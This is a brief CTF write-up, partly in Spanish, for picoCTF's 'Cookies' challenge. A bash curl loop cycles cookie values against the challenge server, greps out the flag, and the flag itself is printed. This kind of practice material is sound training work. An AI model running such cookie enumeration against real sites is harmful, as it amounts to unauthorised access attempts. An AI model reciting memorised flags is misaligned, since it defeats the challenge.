
Descripcion:
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:27177/](http://mercury.picoctf.net:27177/).

Solucion(s):
└─$ for i in {0..20}; do curl -s http://mercury.picoctf.net:27177/check -H "Cookie: name=$i"; done | grep picoCTF

picoCTF{3v3ry1_l0v3s_c00k135_064663be}

Notas:
se utiliza un ciclo for para cambiar el valor de la cookie, y asiendo una peticion por cada variable
final mente con el comando grep filtramos la bandera.
Referencias:
https://www.youtube.com/watch?v=LseQ-XWCXVo&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=12